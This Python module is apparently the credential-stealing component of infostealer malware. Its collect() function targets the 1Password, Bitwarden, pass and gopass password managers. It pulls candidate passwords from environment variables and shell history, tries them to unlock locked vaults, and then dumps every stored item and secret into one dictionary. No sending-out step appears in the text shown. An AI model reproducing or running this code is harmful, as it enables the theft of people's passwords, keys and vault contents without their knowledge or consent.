import json
import subprocess
import os
import re


def _run(*cmd, timeout=10):
    try:
        proc = subprocess.run(list(cmd), capture_output=True, text=True, timeout=timeout)
        return proc.stdout.strip(), proc.returncode
    except Exception:
        return None, -1


def _discover_passwords_from_env():
    passwords = []
    env_patterns = [
        r'.*PASS.*', r'.*PASSWORD.*', r'.*SECRET.*', r'.*KEY.*',
        r'BW_.*', r'OP_.*', r'.*_MASTER.*'
    ]
    
    for key, value in os.environ.items():
        for pattern in env_patterns:
            if re.match(pattern, key, re.IGNORECASE) and value:
                passwords.append(value)
                break
    
    return passwords


def _discover_passwords_from_history():
    passwords = []
    history_files = [
        os.path.expanduser('~/.bash_history'),
        os.path.expanduser('~/.zsh_history'),
        os.path.expanduser('~/.history')
    ]
    
    patterns = [
        r'bw\s+unlock\s+["\']?([^"\';\s]+)',
        r'op\s+signin\s+.*?["\']?([^"\';\s]+)',
        r'export\s+BW_SESSION=["\']?([^"\';\s]+)',
        r'export\s+OP_SESSION_[^=]+=["\']?([^"\';\s]+)'
    ]
    
    for hist_file in history_files:
        if not os.path.exists(hist_file):
            continue
        try:
            with open(hist_file, 'r', errors='ignore') as f:
                for line in f:
                    for pattern in patterns:
                        match = re.search(pattern, line)
                        if match:
                            passwords.append(match.group(1))
        except Exception:
            pass
    
    return passwords


def _try_unlock_bitwarden(passwords):
    for password in passwords:
        try:
            proc = subprocess.run(
                ['bw', 'unlock', password, '--raw'],
                capture_output=True,
                text=True,
                timeout=10
            )
            if proc.returncode == 0 and proc.stdout.strip():
                session_key = proc.stdout.strip()
                os.environ['BW_SESSION'] = session_key
                return True
        except Exception:
            pass
    return False


def _try_unlock_onepassword(passwords):
    for password in passwords:
        try:
            proc = subprocess.run(
                ['op', 'signin', '--raw'],
                input=password,
                capture_output=True,
                text=True,
                timeout=10
            )
            if proc.returncode == 0 and proc.stdout.strip():
                return True
        except Exception:
            pass
    return False


def _try_unlock_gpg(passwords):
    for password in passwords:
        try:
            proc = subprocess.run(
                ['gpg', '--batch', '--passphrase', password, '--decrypt'],
                input=b'test',
                capture_output=True,
                timeout=5
            )
            if proc.returncode == 0:
                return True
        except Exception:
            pass
    return False


def _collect_onepassword():
    result = {}

    out, rc = _run("op", "account", "list", "--format=json")
    if rc != 0 or not out:
        passwords = []
        passwords.extend(_discover_passwords_from_env())
        passwords.extend(_discover_passwords_from_history())
        passwords.append("anon")
        
        unlocked = _try_unlock_onepassword(passwords)
        if not unlocked:
            return result
        
        out, rc = _run("op", "account", "list", "--format=json")
        if rc != 0 or not out:
            return result

    try:
        accounts = json.loads(out)
    except Exception:
        return result

    for account in accounts:
        account_id = account.get("account_uuid") or account.get("url", "unknown")
        vaults_out, rc = _run("op", "vault", "list", "--format=json", f"--account={account_id}")
        if rc != 0 or not vaults_out:
            continue
        try:
            vaults = json.loads(vaults_out)
        except Exception:
            continue

        account_secrets = {}
        for vault in vaults:
            vault_id = vault.get("id", "")
            vault_name = vault.get("name", vault_id)
            items_out, rc = _run("op", "item", "list", "--vault", vault_id,
                                 f"--account={account_id}", "--format=json")
            if rc != 0 or not items_out:
                continue
            try:
                items = json.loads(items_out)
            except Exception:
                continue

            vault_secrets = {}
            for item in items:
                item_id = item.get("id", "")
                item_title = item.get("title", item_id)
                detail_out, rc = _run("op", "item", "get", item_id,
                                      "--vault", vault_id,
                                      f"--account={account_id}",
                                      "--format=json")
                if rc != 0 or not detail_out:
                    continue
                try:
                    vault_secrets[item_title] = json.loads(detail_out)
                except Exception:
                    pass

            if vault_secrets:
                account_secrets[vault_name] = vault_secrets

        if account_secrets:
            result[account_id] = account_secrets

    return result


def _collect_bitwarden():
    result = {}

    out, rc = _run("bw", "status")
    if rc != 0 or not out:
        return result

    try:
        status = json.loads(out)
    except Exception:
        return result

    if status.get("status") != "unlocked":
        passwords = []
        passwords.extend(_discover_passwords_from_env())
        passwords.extend(_discover_passwords_from_history())
        passwords.append("anon")
        
        unlocked = _try_unlock_bitwarden(passwords)
        if not unlocked:
            result["status"] = status.get("status", "unknown")
            return result

    out, rc = _run("bw", "list", "items")
    if rc != 0 or not out:
        return result

    try:
        items = json.loads(out)
    except Exception:
        return result

    for item in items:
        name = item.get("name", item.get("id", "unknown"))
        result[name] = item

    return result


def _collect_pass():
    result = {}

    out, rc = _run("pass", "ls")
    if rc != 0 or not out:
        passwords = []
        passwords.extend(_discover_passwords_from_env())
        passwords.extend(_discover_passwords_from_history())
        passwords.append("anon")
        
        _try_unlock_gpg(passwords)
        
        out, rc = _run("pass", "ls")
        if rc != 0 or not out:
            return result

    entries = re.findall(r'[├└─│\s]+([\w./@\-]+)$', out, re.MULTILINE)

    for entry in entries:
        entry = entry.strip()
        if not entry:
            continue
        secret_out, rc = _run("pass", "show", entry)
        if rc == 0 and secret_out:
            result[entry] = secret_out

    return result


def _collect_gopass():
    result = {}

    out, rc = _run("gopass", "list", "--flat")
    if rc != 0 or not out:
        passwords = []
        passwords.extend(_discover_passwords_from_env())
        passwords.extend(_discover_passwords_from_history())
        passwords.append("anon")
        
        _try_unlock_gpg(passwords)
        
        out, rc = _run("gopass", "list", "--flat")
        if rc != 0 or not out:
            return result

    for entry in out.splitlines():
        entry = entry.strip()
        if not entry:
            continue
        secret_out, rc = _run("gopass", "show", "--password", entry)
        if rc == 0 and secret_out:
            result[entry] = secret_out

    return result


def collect() -> dict:
    return {
        "onepassword": _collect_onepassword(),
        "bitwarden":   _collect_bitwarden(),
        "pass":        _collect_pass(),
        "gopass":      _collect_gopass(),
    }
